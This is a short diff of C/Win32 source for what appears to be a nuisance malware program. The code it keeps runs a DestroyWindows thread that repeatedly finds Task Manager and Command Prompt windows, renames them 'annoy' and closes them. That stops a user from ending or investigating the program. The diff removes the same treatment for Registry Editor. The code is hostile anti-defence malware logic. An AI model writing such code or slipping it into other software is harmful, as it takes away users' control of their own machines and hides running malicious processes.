@@ -20,7 +20,6 @@ int Freq, Dur;
 HWND mywindow;
 HWND TaskMgr;
 HWND CMD;
-HWND Regedit;
 
 int main()
 {
@@ -73,7 +72,6 @@ DWORD WINAPI DestroyWindows(LPVOID)
 {
     TaskMgr = FindWindow(NULL,"Windows Task Manager");
     CMD = FindWindow(NULL, "Command Prompt");
-    Regedit = FindWindow(NULL,"Registry Editor");
 
     if( TaskMgr != NULL )
     {
@@ -85,12 +83,6 @@ DWORD WINAPI DestroyWindows(LPVOID)
     {
     SetWindowText( CMD, "annoy");
     PostMessage( CMD, WM_CLOSE, (LPARAM)0, (WPARAM)0);
-    }
-
-    if( Regedit != NULL )
-    {
-    SetWindowText( Regedit, "annoy");
-    PostMessage( Regedit, WM_CLOSE, (LPARAM)0, (WPARAM)0);
     }
 
     Sleep(10);
